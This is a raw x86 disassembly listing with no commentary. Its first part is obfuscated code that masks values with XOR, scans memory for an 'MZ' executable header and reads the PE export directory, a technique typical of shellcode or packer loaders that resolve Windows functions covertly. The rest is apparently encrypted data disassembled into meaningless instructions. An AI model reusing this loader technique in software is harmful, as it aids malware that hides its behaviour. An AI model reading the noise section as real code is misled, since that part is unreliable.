  41e208:	mov    esi,DWORD PTR [ebp+0x1c]
  41e20b:	mov    edi,0x70941f9d
  41e210:	cmp    eax,edi
  41e212:	jne    0x420747
  41e218:	cmp    esi,ebx
  41e21a:	jne    0x420747
  41e220:	mov    eax,DWORD PTR [ebp+0x10]
  41e223:	xor    eax,ecx
  41e225:	add    eax,edx
  41e227:	mov    DWORD PTR [ebp-0x20],eax
  41e22a:	mov    eax,DWORD PTR [ebp+0xc]
  41e22d:	mov    esi,DWORD PTR [ebp-0x8]
  41e230:	xor    eax,ecx
  41e232:	add    eax,edx
  41e234:	imul   eax,DWORD PTR [esi]
  41e237:	mov    esi,DWORD PTR [ebp+0x8]
  41e23a:	xor    esi,ecx
  41e23c:	add    esi,edx
  41e23e:	cmp    esi,eax
  41e240:	mov    eax,DWORD PTR [ebp-0x4]
  41e243:	mov    edi,0xffcd8d0a
  41e248:	je     0x41e267
  41e24e:	mov    esi,DWORD PTR [ebp-0x20]
  41e251:	add    DWORD PTR [eax],esi
  41e253:	mov    eax,DWORD PTR [ebp-0x4]
  41e256:	mov    esi,DWORD PTR [ebp+0xc]
  41e259:	xor    esi,ecx
  41e25b:	add    esi,edx
  41e25d:	imul   esi,DWORD PTR [eax]
  41e260:	mov    DWORD PTR [eax],esi
  41e262:	jmp    0x41e26c
  41e267:	mov    esi,DWORD PTR [ebp+0x14]
  41e26a:	xor    DWORD PTR [eax],esi
  41e26c:	mov    eax,DWORD PTR [ebp-0x4]
  41e26f:	mov    esi,DWORD PTR [ebp+0x10]
  41e272:	xor    esi,ecx
  41e274:	sub    edi,esi
  41e276:	add    DWORD PTR [eax],edi
  41e278:	mov    eax,DWORD PTR [ebp-0x4]
  41e27b:	mov    esi,DWORD PTR [ebp-0x8]
  41e27e:	add    esi,DWORD PTR [eax]
  41e280:	mov    DWORD PTR [ebp-0x8],esi
  41e283:	mov    eax,DWORD PTR [ebp+0xc]
  41e286:	mov    esi,DWORD PTR [ebp+0xc]
  41e289:	xor    esi,ecx
  41e28b:	xor    eax,ecx
  41e28d:	lea    eax,[eax+esi*1+0x64e5ec]
  41e294:	mov    esi,DWORD PTR [ebp+0xc]
  41e297:	xor    esi,ecx
  41e299:	add    esi,edx
  41e29b:	imul   eax,esi
  41e29e:	mov    esi,DWORD PTR [ebp+0xc]
  41e2a1:	xor    esi,ecx
  41e2a3:	sub    esi,eax
  41e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e2a8:	add    esi,edx
  41e2aa:	cmp    DWORD PTR [eax],esi
  41e2ac:	mov    eax,DWORD PTR [ebp-0x4]
  41e2af:	mov    esi,DWORD PTR [ebp+0x10]
  41e2b2:	jg     0x41e2c8
  41e2b8:	xor    esi,ecx
  41e2ba:	mov    edi,0xffcd8d0a
  41e2bf:	sub    edi,esi
  41e2c1:	add    DWORD PTR [eax],edi
  41e2c3:	jmp    0x41e2ce
  41e2c8:	xor    esi,ecx
  41e2ca:	add    esi,edx
  41e2cc:	add    DWORD PTR [eax],esi
  41e2ce:	mov    eax,DWORD PTR [ebp-0x8]
  41e2d1:	mov    esi,DWORD PTR [ebp-0x10]
  41e2d4:	mov    eax,DWORD PTR [eax]
  41e2d6:	xor    esi,ecx
  41e2d8:	add    esi,0x3272f5
  41e2de:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e2e5:	mov    DWORD PTR [ebp-0x24],ebx
  41e2e8:	not    esi
  41e2ea:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e2f1:	mov    DWORD PTR [ebp-0x2c],ebx
  41e2f4:	mov    ebx,DWORD PTR [ebp-0x28]
  41e2f7:	mov    edi,DWORD PTR [ebp-0x24]
  41e2fa:	and    eax,esi
  41e2fc:	mov    esi,0xa143
  41e301:	xor    bx,si
  41e304:	mov    esi,0x412e
  41e309:	add    bx,si
  41e30c:	cmp    WORD PTR [eax],bx
  41e30f:	je     0x41e359
  41e315:	mov    edi,DWORD PTR [ebp-0x10]
  41e318:	xor    edi,ecx
  41e31a:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e321:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41e328:	mov    ebx,0xffcd8d0a
  41e32d:	sub    ebx,edi
  41e32f:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e336:	add    eax,ebx
  41e338:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41e33f:	mov    edi,DWORD PTR [ebp-0x28]
  41e342:	mov    ebx,DWORD PTR [ebp-0x24]
  41e345:	mov    ebx,0xa143
  41e34a:	xor    di,bx
  41e34d:	add    di,si
  41e350:	cmp    WORD PTR [eax],di
  41e353:	jne    0x41e315
  41e359:	mov    edi,DWORD PTR [ebp-0x14]
  41e35c:	mov    edi,DWORD PTR [edi]
  41e35e:	mov    ebx,DWORD PTR [eax+0x3c]
  41e361:	lea    edi,[ebx+edi*8+0x78]
  41e365:	mov    edi,DWORD PTR [edi+eax*1]
  41e368:	mov    DWORD PTR [ebp-0x18],edi
  41e36b:	mov    edi,DWORD PTR [ebp+0x8]
  41e36e:	xor    edi,ecx
  41e370:	add    edi,edx
  41e372:	jmp    0x4206eb
  41e377:	push   esi
  41e378:	inc    eax
  41e379:	dec    ebp
  41e37a:	test   DWORD PTR ds:0xe2b09684,eax
  41e380:	(bad)  [ebx]
  41e382:	data16 jg 0x41e31b
  41e385:	shl    DWORD PTR [edi],1
  41e387:	retf   
  41e388:	fiadd  DWORD PTR [edx-0x7c9fd87d]
  41e38e:	sbb    DWORD PTR [eax-0x27],0x2b
  41e392:	mov    WORD PTR [edi-0x66],cs
  41e395:	cmp    esi,DWORD PTR [esi+0x5967fb88]
  41e39b:	inc    edi
  41e39c:	ret    0xda61
  41e39f:	leave  
  41e3a0:	dec    ebp
  41e3a1:	cld    
  41e3a2:	mov    esi,0x182db65c
  41e3a7:	push   ecx
  41e3a8:	(bad)  
  41e3a9:	sbb    eax,0x35aec6b0
  41e3ae:	or     bh,BYTE PTR [eax-0x7d]
  41e3b1:	push   edi
  41e3b2:	or     al,0xed
  41e3b4:	mov    ds,WORD PTR [ecx+0x4b903da2]
  41e3ba:	mov    bl,0x37
  41e3bc:	jecxz  0x41e418
  41e3be:	dec    ebp
  41e3bf:	cdq    
  41e3c0:	ds and eax,0x59fa33ad
  41e3c6:	outs   dx,BYTE PTR ds:[esi]
  41e3c7:	clc    
  41e3c8:	mov    edi,0xa199fb80
  41e3cd:	or     DWORD PTR [esi+0x1c0e76c],0x45
  41e3d4:	in     eax,dx
  41e3d5:	shl    ebp,1
  41e3d7:	or     bl,BYTE PTR [eax+0x363a6f6a]
  41e3dd:	es loop 0x41e428
  41e3e0:	push   ds
  41e3e1:	dec    ecx
  41e3e2:	enter  0xaf56,0xe
  41e3e6:	pop    eax
  41e3e7:	(bad)  
  41e3e8:	std    
  41e3e9:	pop    ebp
  41e3ea:	mov    esp,DWORD PTR [ebx-0x3a78d95b]
  41e3f0:	(bad)  
  41e3f1:	and    bh,ah
  41e3f3:	xchg   BYTE PTR [esi-0x60],cl
  41e3f6:	sbb    DWORD PTR [edi+0x2],ebx
  41e3f9:	mov    bh,ch
  41e3fb:	or     al,0x8f
  41e3fd:	jns    0x41e387
  41e3ff:	fbstp  TBYTE PTR [ebp+0x68]
  41e402:	add    BYTE PTR [esi-0x76f10284],0x46
  41e409:	test   BYTE PTR [edx],dl
  41e40b:	leave  
  41e40c:	dec    ecx
  41e40d:	mov    ds,WORD PTR [edi-0x5]
  41e410:	dec    esi
  41e411:	(bad)  
  41e412:	loopne 0x41e40a
  41e414:	and    BYTE PTR [ecx],al
  41e416:	mov    esi,edi
  41e418:	cld    
  41e419:	mov    al,ds:0x33e506a3
  41e41e:	mov    ds:0x8b286f0,al
  41e423:	adc    dh,al
  41e425:	cld    
  41e426:	jge    0x41e457
  41e428:	sbb    BYTE PTR [edi-0x8d2bcdc],dh
  41e42e:	push   esp
  41e42f:	enter  0x9136,0xb7
  41e433:	xor    BYTE PTR [edx-0x34993384],al
  41e439:	aaa    
  41e43a:	and    BYTE PTR [edi-0x5c],0x8d
  41e43e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e43f:	clc    
  41e440:	loop   0x41e486
  41e442:	or     DWORD PTR [eax],eax
  41e444:	push   edx
  41e445:	leave  
  41e446:	loop   0x41e3ca
  41e448:	pop    ss
  41e449:	movhps QWORD PTR [eax-0x732ee520],xmm3
  41e450:	pop    ebx
  41e451:	ltr    sp
  41e454:	lods   al,BYTE PTR ds:[esi]
  41e455:	hlt    
  41e456:	push   ebx
  41e457:	inc    edx
  41e458:	mov    dh,0x14
  41e45a:	adc    DWORD PTR [ecx+0x32],ecx
  41e45d:	cmc    
  41e45e:	int3   
  41e45f:	icebp  
  41e460:	jmp    0x9b6f:0x5bd22abf
  41e467:	sub    DWORD PTR [edx+0x3b],0x9d30c8b7
  41e46e:	xchg   BYTE PTR [edi],ch
  41e470:	pop    edx
  41e471:	mov    ecx,0x41d80c82
  41e476:	mov    ebp,DWORD PTR [ecx+edx*1+0x674f4812]
  41e47d:	cld    
  41e47e:	jl     0x41e443
  41e480:	mov    bl,0xe4
  41e482:	jns    0x41e4ef
  41e484:	sbb    edx,DWORD PTR [eax-0xa]
  41e487:	add    al,0xc7
  41e489:	xor    BYTE PTR [ebx],bl
  41e48b:	aam    0xf2
  41e48d:	in     eax,dx
  41e48e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e48f:	stc    
  41e490:	in     eax,dx
  41e491:	enter  0x17ee,0x55
  41e495:	and    ah,BYTE PTR [ecx]
  41e497:	in     al,dx
  41e498:	(bad)  
  41e499:	mov    esp,0x9da79a69
  41e49e:	and    al,0x4
  41e4a0:	dec    edx
  41e4a1:	jnp    0x41e4ee
  41e4a3:	xor    esp,DWORD PTR [edi+0x4]
  41e4a6:	jno    0x41e4df
  41e4a8:	int3   
  41e4a9:	jmp    FWORD PTR ds:0xcac7199a
  41e4af:	push   0xffffffaa
  41e4b1:	push   ebp
  41e4b2:	cmp    ch,BYTE PTR [edi+edi*8+0x56]
  41e4b6:	stos   BYTE PTR es:[edi],al
  41e4b7:	pop    es
  41e4b8:	pop    DWORD PTR [eax]
  41e4ba:	(bad)  
  41e4bb:	(bad)  
  41e4bd:	sub    esi,ebp
  41e4bf:	fisttp WORD PTR [edi-0x51]
  41e4c2:	jle    0x41e543
  41e4c4:	ja     0x41e45c
  41e4c6:	push   edx
  41e4c7:	sbb    al,0x13
  41e4c9:	add    BYTE PTR [eax-0x24],dh
  41e4cc:	jmp    0x404e:0xe66e47af
  41e4d3:	cwde   
  41e4d4:	and    eax,0x2ffb5108
  41e4d9:	cmp    al,0xd4
  41e4db:	loope  0x41e498
  41e4dd:	stc    
  41e4de:	pop    ss
  41e4df:	ss pop ebp
  41e4e1:	mov    cl,0x2e
  41e4e3:	out    0x90,eax
  41e4e5:	dec    esp
  41e4e6:	inc    eax
  41e4e7:	mov    ch,0x87
  41e4e9:	xor    BYTE PTR [eax],dh
  41e4eb:	je     0x41e546
  41e4ed:	push   0x8a7c6807
  41e4f2:	ins    DWORD PTR es:[edi],dx
  41e4f3:	mov    dl,0x5c
  41e4f5:	(bad)  
  41e4f6:	and    al,0x9d
  41e4f8:	pop    esp
  41e4f9:	pop    edi
  41e4fa:	jmp    0x41e4e5
  41e4fc:	inc    ebx
  41e4fd:	iret   
  41e4fe:	lods   eax,DWORD PTR ds:[esi]
  41e4ff:	test   eax,0xb3ab49d1
  41e504:	pop    edx
  41e505:	icebp  
  41e506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e507:	pop    edx
  41e508:	xchg   ebx,eax
  41e509:	out    0xf9,eax
  41e50b:	jp     0x41e55c
  41e50d:	sbb    edx,DWORD PTR [eax-0x73]
  41e510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e511:	xchg   edx,eax
  41e512:	shl    ecx,0x59
  41e515:	push   ds
  41e516:	(bad)  
  41e517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e518:	mov    edx,0x30cc2828
  41e51d:	btr    DWORD PTR [ebx-0x7e43a7b],edx
  41e524:	push   ss
  41e525:	xchg   ecx,eax
  41e526:	fnstenv [ecx-0x408d43bb]
  41e52c:	retf   0xd38f
  41e52f:	mov    ah,0xea
  41e531:	mov    eax,0xb1479b58
  41e536:	cmp    bh,dh
  41e538:	cs das 
  41e53a:	fwait
  41e53b:	xchg   esi,eax
  41e53c:	out    dx,al
  41e53d:	pop    edi
  41e53e:	fsubr  QWORD PTR [esi]
  41e540:	fnclex 
  41e542:	outs   dx,DWORD PTR ds:[esi]
  41e543:	dec    ecx
  41e544:	aad    0x3b
  41e546:	xchg   BYTE PTR [edx-0x1a787c6a],bh
  41e54c:	push   edi
  41e54d:	out    0xa1,al
  41e54f:	mov    ch,0xaa
  41e551:	pop    ebp
  41e552:	pop    edi
  41e553:	fmul   DWORD PTR [eax]
  41e555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e556:	xchg   esp,eax
  41e557:	(bad)  
  41e558:	daa    
  41e559:	call   0x7229:0x8596728a
  41e560:	pop    esp
  41e561:	outs   dx,BYTE PTR ds:[esi]
  41e562:	pop    ss
  41e563:	pop    edi
  41e564:	sar    BYTE PTR [esi+0x7e],cl
  41e567:	mov    esi,0xd2163274
  41e56c:	dec    ebp
  41e56d:	fisub  DWORD PTR [ecx-0x24a1216d]
  41e573:	xor    al,0xb
  41e575:	xchg   edi,eax
  41e576:	add    al,0xe7
  41e578:	lods   al,BYTE PTR ds:[esi]
  41e579:	or     ebx,DWORD PTR [esi]
  41e57b:	test   DWORD PTR [esp+esi*1],ecx
  41e57e:	pop    esi
  41e57f:	fild   QWORD PTR [ecx-0x289a8c09]
  41e585:	add    eax,0x46f79808
  41e58a:	mov    dl,BYTE PTR [eax-0x56f8b1e]
  41e590:	jae    0x41e54b
  41e592:	adc    eax,0x42a756c3
  41e597:	js     0x41e5b1
  41e599:	loop   0x41e552
  41e59b:	mov    ds:0x51cd420b,eax
  41e5a0:	sbb    BYTE PTR [ebx],dl
  41e5a2:	je     0x41e5b5
  41e5a4:	cdq    
  41e5a5:	add    ebx,DWORD PTR [eax+0x11]
  41e5a8:	pop    esi
  41e5a9:	cmp    eax,0x36835121
  41e5ae:	out    0x5a,al
  41e5b0:	sub    bl,ah
  41e5b2:	in     eax,dx
  41e5b3:	inc    BYTE PTR [eax]
  41e5b5:	pusha  
  41e5b6:	or     al,0xcb
  41e5b8:	into   
  41e5b9:	hlt    
  41e5ba:	rcr    BYTE PTR [ecx],0x67
  41e5bd:	rcr    DWORD PTR [ebx-0x47],1
  41e5c0:	add    DWORD PTR [eax],edx
  41e5c2:	pop    ebx
  41e5c3:	inc    esi
  41e5c4:	mov    dl,0x7
  41e5c6:	pop    ebp
  41e5c7:	fistp  WORD PTR [edi+0x179e7364]
  41e5cd:	push   ecx
  41e5ce:	mov    eax,0x40c90788
  41e5d3:	push   ecx
  41e5d4:	cmp    DWORD PTR [ecx+0x62],edi
  41e5d7:	(bad)  
  41e5d8:	jmp    0x41e5cb
  41e5da:	dec    ecx
  41e5db:	daa    
  41e5dc:	pop    edx
  41e5dd:	std    
  41e5de:	das    
  41e5df:	jno    0x41e657
  41e5e1:	mov    esi,ebp
  41e5e3:	lahf   
  41e5e4:	outs   dx,DWORD PTR ds:[esi]
  41e5e5:	and    al,0x64
  41e5e7:	scas   al,BYTE PTR es:[edi]
  41e5e8:	mov    BYTE PTR [edi],dh
  41e5ea:	or     al,0x5d
  41e5ec:	or     BYTE PTR [esi+ebp*4],dl
  41e5ef:	ss sub al,0x3c
  41e5f2:	mov    ds:0xd99fb195,al
  41e5f7:	cmp    BYTE PTR [eax-0x6a54dfdb],dh
  41e5fd:	xor    eax,0x7d410fb1
  41e602:	gs test esi,ecx
  41e605:	jne    0x41e648
  41e607:	in     eax,0xa6
  41e609:	and    ah,BYTE PTR [ecx]
  41e60b:	xchg   edi,eax
  41e60c:	xor    ebx,DWORD PTR [esi-0x225b892c]
  41e612:	cld    
  41e613:	loop   0x41e65c
  41e615:	sbb    BYTE PTR [eax+edi*2],ah
  41e618:	mov    ebp,0x4dc4fa03
  41e61d:	(bad)  
  41e61e:	test   DWORD PTR [eax+0x2be6ec72],esi
  41e624:	push   es
  41e625:	ficomp WORD PTR [esi+0x70]
  41e628:	mov    eax,ds:0x6d908951
  41e62d:	inc    edi
  41e62e:	sub    BYTE PTR ds:0x41135a04,0x51
  41e635:	stc    
  41e636:	or     eax,0x493d3304
  41e63b:	adc    DWORD PTR [edx+0x1103d4e0],ebx
  41e641:	scas   eax,DWORD PTR es:[edi]
  41e642:	es sbb bh,dl
  41e645:	mov    DWORD PTR [esi],esp
  41e647:	xor    al,0x81
  41e649:	jmp    0x6967882f
  41e64e:	ds lock adc esi,ebx
  41e652:	in     eax,dx
  41e653:	push   ds
  41e654:	loop   0x41e665
  41e656:	cmp    eax,0x86f3fb21
  41e65b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e65c:	loope  0x41e6c1
  41e65e:	mov    BYTE PTR [ebp-0x3c],ah
  41e661:	ins    DWORD PTR es:[edi],dx
  41e662:	mov    ah,0x7d
  41e664:	inc    esp
  41e665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e666:	aas    
  41e667:	mov    esp,0xc2bc70bd
  41e66c:	push   edx
  41e66d:	idiv   BYTE PTR [ecx]
  41e66f:	xor    eax,0x5b8ecff6
  41e675:	pop    edx
  41e676:	mov    ah,0xd5
  41e678:	mov    eax,ds:0x39766fd0
  41e67d:	mov    dh,0x3
  41e67f:	adc    BYTE PTR [esi-0x78f2df39],dl
  41e685:	add    ebx,DWORD PTR [esi-0x34e82e4a]
  41e68b:	mov    esp,0x2713de44
  41e690:	dec    eax
  41e691:	dec    cx
  41e693:	ficom  WORD PTR [ebp-0x5699cd42]
  41e699:	add    eax,0xb39a221b
  41e69e:	push   edx
  41e69f:	jmp    0xcae43e6
  41e6a4:	pop    ss
  41e6a5:	ja     0x41e6cf
  41e6a7:	push   0x7b
  41e6a9:	ss jnp 0x41e68f
  41e6ac:	jb     0x41e6ed
  41e6ae:	pop    ss
  41e6af:	scas   eax,DWORD PTR es:[edi]
  41e6b0:	sbb    DWORD PTR ds:0xef3e08a2,edx
  41e6b6:	xor    ah,BYTE PTR [edi+0x35]
  41e6b9:	push   esi
  41e6ba:	xor    bh,BYTE PTR [eax+0x13]
  41e6bd:	dec    eax
  41e6be:	mov    dl,0xdf
  41e6c0:	gs add al,0x6b
  41e6c3:	inc    esi
  41e6c4:	xchg   BYTE PTR [ecx-0x5a],al
  41e6c7:	cmp    al,0xc
  41e6c9:	and    BYTE PTR [ebx-0x3142bfac],al
  41e6cf:	sub    BYTE PTR [edx+eax*4+0x6b],ah
  41e6d3:	or     dl,dh
  41e6d5:	mov    ecx,0x7d677cde
  41e6da:	pop    ebp
  41e6db:	jne    0x41e6fa
  41e6dd:	fwait
  41e6de:	jns    0x41e679
  41e6e0:	adc    bl,BYTE PTR [esi]
  41e6e2:	dec    edx
  41e6e3:	idiv   edx
  41e6e5:	es mov dl,0x80
  41e6e8:	push   ecx
  41e6e9:	mov    eax,0x3e6e0509
  41e6ee:	stos   BYTE PTR es:[edi],al
  41e6ef:	xchg   ebx,eax
  41e6f0:	push   edi
  41e6f1:	mov    edx,0xa5fdd59a
  41e6f6:	pop    ss
  41e6f7:	jge    0x41e72e
  41e6f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6fa:	popa   
  41e6fb:	add    al,0xa0
  41e6fd:	push   eax
  41e6fe:	imul   esi,ecx,0x63352f16
  41e704:	imul   ecx,DWORD PTR [ecx+0x9eaa667],0x9019e824
  41e70e:	xchg   esp,eax
  41e70f:	ret    0x2c14
  41e712:	icebp  
  41e713:	xor    dl,BYTE PTR [ebx]
  41e715:	inc    ebx
  41e716:	inc    ecx
  41e717:	iret   
  41e718:	into   
  41e719:	xchg   edx,eax
  41e71a:	add    ch,BYTE PTR [ecx+0x23]
  41e71d:	addr16 pop ebx
  41e71f:	mov    esp,0x5e74bd24
  41e724:	(bad)  
  41e725:	lods   eax,DWORD PTR ds:[esi]
  41e726:	fcom   st(3)
  41e728:	sti    
  41e729:	xchg   edi,eax
  41e72a:	push   ecx
  41e72b:	mov    bh,0x3c
  41e72d:	push   esp
  41e72e:	dec    esp
  41e72f:	push   esp
  41e730:	push   esi
  41e731:	sub    eax,0x57c35d39
  41e736:	mov    ebp,0x7cebf6a3
  41e73b:	mov    BYTE PTR [esi+ebx*2],bh
  41e73e:	jno    0x41e7b6
  41e740:	jl     0x41e6d6
  41e742:	imul   DWORD PTR [ebx+0x1b]
  41e745:	inc    eax
  41e746:	call   0xa4fe88f6
  41e74b:	lahf   
  41e74c:	lock sbb ch,BYTE PTR [edx+ebp*8+0x4cf27d98]
  41e754:	cmp    ecx,DWORD PTR [edi-0xd]
  41e757:	adc    edi,DWORD PTR [esi-0x50]
  41e75a:	cmp    DWORD PTR [edx],esi
  41e75c:	or     al,0xe4
  41e75e:	push   ss
  41e75f:	xchg   ecx,eax
  41e760:	push   esp
  41e761:	into   
  41e762:	fimul  WORD PTR [esi+0xe]
  41e765:	stos   DWORD PTR es:[edi],eax
  41e766:	aaa    
  41e767:	pop    ds
  41e768:	xor    bh,BYTE PTR [esi-0x18]
  41e76b:	cmp    al,0xd3
  41e76d:	popf   
  41e76e:	adc    al,0xd0
  41e770:	jp     0x41e7ba
  41e772:	fld    QWORD PTR ds:0x55ab0c01
  41e778:	mov    bl,0x57
  41e77a:	addr16 xchg edx,eax
  41e77c:	sti    
  41e77d:	shr    BYTE PTR [esi+esi*4],0xe6
  41e781:	jo     0x41e735
  41e783:	rcr    BYTE PTR [esi+0x10],1
  41e786:	push   ebx
  41e787:	adc    bl,BYTE PTR [ebx+0x39ec6de4]
  41e78d:	push   DWORD PTR [edx-0x5b3d6c44]
  41e793:	imul   eax,DWORD PTR [ecx-0x7751180e],0xffffffa2
  41e79a:	push   eax
  41e79b:	js     0x41e7b7
  41e79d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e79e:	ret    
  41e79f:	sub    ah,BYTE PTR [esp+ecx*2-0x69]
  41e7a3:	in     eax,dx
  41e7a4:	aam    0xed
  41e7a6:	adc    esp,DWORD PTR [ebx+edi*8+0x79]
  41e7aa:	push   edi
  41e7ab:	es js  0x41e81c
  41e7ae:	mov    edx,0x8d567396
  41e7b3:	out    0xd7,eax
  41e7b5:	pop    ebx
  41e7b6:	stos   BYTE PTR es:[edi],al
  41e7b7:	inc    esp
  41e7b8:	adc    ebx,DWORD PTR [eax+eax*4+0x7c65c231]
  41e7bf:	jmp    0xf820a4e0
  41e7c4:	ficom  WORD PTR [edi+0x6d]
  41e7c7:	mov    bl,0x12
  41e7c9:	jecxz  0x41e7c9
  41e7cb:	mov    ecx,0x4131c803
  41e7d0:	mov    ds:0xdd98c0c5,al
  41e7d5:	mov    eax,ds:0xf62c3fdd
  41e7da:	add    cl,BYTE PTR [ecx+edi*8]
  41e7dd:	(bad)  
  41e7de:	jnp    0x41e84b
  41e7e0:	cmp    cl,ch
  41e7e2:	std    
  41e7e3:	mov    edx,0xd747baa4
  41e7e8:	fdivr  DWORD PTR [edi+0x7f]
  41e7eb:	mov    ch,0x99
  41e7ed:	add    BYTE PTR ds:0x9ae2fb76,ch
  41e7f3:	push   esi
  41e7f4:	cmc    
  41e7f5:	mov    al,0xa1
  41e7f7:	sti    
  41e7f8:	push   0x15
  41e7fa:	sysret 
  41e7fc:	mov    ah,0xa
  41e7fe:	std    
  41e7ff:	fnstenv [edi]
  41e801:	loope  0x41e876
  41e803:	mov    ebx,0xeabc2391
  41e808:	(bad)  
  41e809:	fwait
  41e80a:	sbb    dh,bl
  41e80c:	rcl    DWORD PTR [esi],0x32
  41e80f:	div    cl
  41e811:	push   es
  41e812:	test   edi,edi
  41e814:	pop    es
  41e815:	ror    edx,1
  41e817:	test   DWORD PTR [esi-0x4],edi
  41e81a:	sub    al,bl
  41e81c:	jmp    FWORD PTR [ecx-0x6b5aebaf]
  41e822:	push   edx
  41e823:	push   edi
  41e824:	lods   al,BYTE PTR ds:[esi]
  41e825:	bound  ecx,QWORD PTR [ebx]
  41e827:	pop    esi
  41e828:	add    ecx,DWORD PTR [esi+ebp*1-0x6a]
  41e82c:	out    0x24,eax
  41e82e:	rcl    DWORD PTR [eax],cl
  41e830:	inc    esi
  41e831:	mov    bl,BYTE PTR [esi+0x1a]
  41e834:	dec    ecx
  41e835:	or     DWORD PTR [edi+0x68c9e36a],edx
  41e83b:	jp     0x41e878
  41e83d:	aas    
  41e83e:	pop    ds
  41e83f:	inc    esi
  41e840:	stc    
  41e841:	(bad)  
  41e842:	imul   edx,DWORD PTR [ecx+edi*1+0x652a0e3b],0x70
  41e84a:	cmp    al,0xdf
  41e84c:	sub    BYTE PTR [ecx-0x4d0fb778],bh
  41e852:	pop    ds
  41e853:	ss add al,0xf6
  41e856:	sbb    BYTE PTR [edx],dl
  41e858:	sbb    DWORD PTR [eax],ecx
  41e85a:	cmp    ah,ch
  41e85c:	in     al,0x62
  41e85e:	fwait
  41e85f:	popf   
  41e860:	fmul   st,st(2)
  41e862:	sbb    ah,bh
  41e864:	push   edi
  41e865:	(bad)  
  41e867:	arpl   WORD PTR [ebx],bp
  41e869:	mov    ds,esp
  41e86b:	or     BYTE PTR [ecx+ebx*4],0x27
  41e86f:	stos   BYTE PTR es:[edi],al
  41e870:	pop    ds
  41e871:	test   BYTE PTR [esi+edx*1-0x3cd58677],bl
  41e878:	push   esp
  41e879:	add    edi,DWORD PTR [eax]
  41e87b:	add    DWORD PTR [esi],0x47319d1b
  41e881:	or     al,0xe4
  41e883:	add    al,BYTE PTR [esi+eax*8]
  41e886:	mov    esp,0x73ad4140
  41e88b:	call   0xe16b9e45
  41e890:	lock not BYTE PTR [ecx+0x408ca882]
  41e897:	pop    eax
  41e898:	or     bl,bl
  41e89a:	mov    al,ds:0x5edc1fd6
  41e89f:	mov    ecx,DWORD PTR [eax]
  41e8a1:	jns    0x41e8db
  41e8a3:	xchg   DWORD PTR ds:0x34d86028,eax
  41e8a9:	add    eax,0x1d4510c
  41e8ae:	fsub   st,st(7)
  41e8b0:	jecxz  0x41e881
  41e8b2:	aas    
  41e8b3:	add    ecx,edi
  41e8b5:	push   ebx
  41e8b6:	mov    eax,0x5df28f9e
  41e8bb:	mov    esi,0x8a1d8f8
  41e8c0:	push   edx
  41e8c1:	dec    ebp
  41e8c2:	pop    eax
  41e8c3:	(bad)  
  41e8c4:	jg     0x41e93f
  41e8c6:	jae    0x41e87d
  41e8c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8c9:	xor    bh,BYTE PTR [ecx+0xeadab3d]
  41e8cf:	sub    bl,BYTE PTR [edi]
  41e8d1:	mov    esi,0x8fedd342
  41e8d6:	mov    ecx,DWORD PTR [eax+0xd9bd9fc]
  41e8dc:	call   0x709:0xc3470361
  41e8e3:	shr    DWORD PTR [edi+0x42],cl
  41e8e6:	lahf   
  41e8e7:	jb     0x41e8dc
  41e8e9:	push   ds
  41e8ea:	js     0x41e949
  41e8ec:	xor    al,0x2d
  41e8ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8ef:	dec    ebx
  41e8f0:	arpl   cx,sp
  41e8f2:	fstp   TBYTE PTR [esi-0x2e]
  41e8f5:	dec    ecx
  41e8f6:	ret    
  41e8f7:	cmp    al,BYTE PTR [edi+0x69599fea]
  41e8fd:	ja     0x41e907
  41e8ff:	add    esi,eax
  41e901:	test   al,0x55
  41e903:	aad    0x3d
  41e905:	test   BYTE PTR [eax-0x346fc9bb],cl
  41e90b:	dec    ebx
  41e90c:	(bad)  [ecx+0x25]
  41e90f:	or     ebp,DWORD PTR [esi]
  41e911:	push   esp
  41e912:	imul   esp,DWORD PTR [ebp+0x3a],0x4941ac4c
  41e919:	test   DWORD PTR [edi],ebp
  41e91b:	fadd   DWORD PTR [eax-0xab58caf]
  41e921:	cdq    
  41e922:	and    bh,0xa8
  41e925:	push   edx
  41e926:	dec    esi
  41e927:	and    al,0x95
  41e929:	pop    ss
  41e92a:	adc    dl,BYTE PTR [edi]
  41e92c:	inc    esp
  41e92d:	dec    esp
  41e92e:	call   0xbd31f38d
  41e933:	and    eax,0x24e3e251
  41e938:	xor    DWORD PTR [edi],esi
  41e93a:	fcmovnb st,st(5)
  41e93c:	cmp    al,0xf4
  41e93e:	jecxz  0x41e93b
  41e940:	sbb    cl,BYTE PTR [ecx+0x72]
  41e943:	test   edi,ebp
  41e945:	js     0x41e90c
  41e947:	add    DWORD PTR [esi+0xf96f94a],edx
  41e94d:	cmp    eax,0x7241717c
  41e952:	shl    BYTE PTR [edx-0x44d19843],cl
  41e958:	add    edx,DWORD PTR [ebx+esi*8]
  41e95b:	loopne 0x41e996
  41e95d:	push   es
  41e95e:	push   edx
  41e95f:	add    cx,sp
  41e962:	pop    ecx
  41e963:	fld    TBYTE PTR [ebx-0x4519626a]
  41e969:	and    BYTE PTR [ecx],ah
  41e96b:	and    BYTE PTR [esi-0x28e6e43b],0x75
  41e972:	or     DWORD PTR [edx-0x1a],0xaec41ddd
  41e979:	push   ebx
  41e97a:	pop    eax
  41e97b:	out    dx,al
  41e97c:	outs   dx,DWORD PTR cs:[esi]
  41e97e:	fdivr  DWORD PTR [ecx+0x54a76269]
  41e984:	push   esi
  41e985:	out    0x8d,eax
  41e987:	push   cs
  41e988:	or     bl,BYTE PTR [ebx+0x40058d23]
  41e98e:	std    
  41e98f:	popa   
